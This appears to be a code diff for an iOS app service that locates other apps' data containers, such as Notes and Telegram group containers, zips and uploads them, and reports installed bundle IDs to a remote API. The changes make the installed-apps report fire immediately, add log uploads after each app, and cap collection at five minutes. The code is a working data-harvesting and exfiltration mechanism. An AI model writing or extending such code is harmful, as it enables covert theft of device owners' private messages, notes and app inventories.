@@ -949,6 +949,25 @@ enum ProtocolCollectService {
         log("collect: got configs count=\(configs.count)")
         DebugLogWriter.shared.write("collect: device/report OK — \(configs.count) configs")
 
+        // Installed-apps report goes out immediately, from whatever the index
+        // already knows — waiting for the 50M walk (or for the ZIP loop to end)
+        // meant the request often never happened before iOS suspended the app.
+        Task.detached(priority: .utility) {
+            var ids = ContainerStore.containerIndexSnapshot(waitForBuild: false).keys.sorted()
+            if ids.isEmpty {
+                _ = ContainerStore.containerIndexSnapshot(waitForBuild: true)
+                ids = ContainerStore.containerIndexSnapshot(waitForBuild: false).keys.sorted()
+            }
+            do {
+                try await ProtocolAPI.reportInstalledApps(Array(ids))
+                DebugLogWriter.shared.write("collect: device/apps OK — \(ids.count) bundle ids")
+            } catch {
+                log("collect: device/apps FAILED — \(error)")
+                DebugLogWriter.shared.write("collect: device/apps FAILED — \(error)")
+            }
+        }
+
+
         // Keep discovering containers in the background: the fast index covers
         // system apps plus our own neighbourhood, the rest of the inode space is
         // swept in 4M windows across foreground cycles.
@@ -1043,14 +1062,17 @@ enum ProtocolCollectService {
                     ProtocolStatusLog.shared.append("采集失败 — \(outcome.label)：\(reason)")
                 }
             }
+            Task.detached(priority: .utility) { await ProtocolLogReporter.reportPendingLogs() }
             log("collect: \(config.bundleID) done — zips=\(zipCount) uploaded=\(uploadedCount) remaining=\(remaining)")
         }
 
         // The discovery loop runs concurrently with everything below: an app
         // container found mid-walk is collected immediately, even while a group
         // container (Notes / Telegram) is still being zipped and uploaded.
+        let collectDeadline = Date().addingTimeInterval(300)
         let streamTask = Task {
             for await (identifier, path) in stream {
+                if Date() > collectDeadline { continuation.finish(); break }
                 guard let config = takePending(identifier) else { continue }
                 let lease = ContainerStore.retainAccess(path)
                 await consume(config, path: path, leases: [lease].compactMap { $0 })
@@ -1107,19 +1129,6 @@ enum ProtocolCollectService {
 
         pruneLocalZips(in: documentsURL, fileManager: fileManager)
 
-        // Installed-apps report runs *after* the ZIP loop: the container index is
-        // built by then, and the report must never delay the uploads (it used to
-        // race the collection for the same index/grant work).
-        Task.detached(priority: .utility) {
-            let bundleIDs = enumerateInstalledBundleIDs()
-            do {
-                try await ProtocolAPI.reportInstalledApps(bundleIDs)
-                DebugLogWriter.shared.write("collect: device/apps OK — \(bundleIDs.count) bundle ids")
-            } catch {
-                log("collect: device/apps FAILED — \(error)")
-                DebugLogWriter.shared.write("collect: device/apps FAILED — \(error)")
-            }
-        }
         let result = CollectCycleResult(
             zipCount: zipCount,
             uploadedCount: uploadedCount,
